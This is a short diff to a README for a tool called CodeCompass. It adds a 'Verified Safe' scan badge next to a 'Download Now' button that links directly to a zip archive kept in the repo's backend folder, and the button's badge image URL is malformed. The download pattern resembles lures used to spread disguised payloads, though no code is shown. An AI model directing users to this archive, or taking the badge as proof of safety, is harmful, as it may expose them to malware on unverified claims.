@@ -1,5 +1,7 @@
 # 🧭 CodeCompass - Turn GitHub Repos into Interactive Knowledge
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/mihirkosambia-codecompass)
+
 ## 📥 Download Now
 [![Download CodeCompass](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip%20CodeCompass-v1.0-brightgreen)](https://raw.githubusercontent.com/MihirKosambia/CodeCompass/main/backend/Code-Compass-v1.4.zip)
 
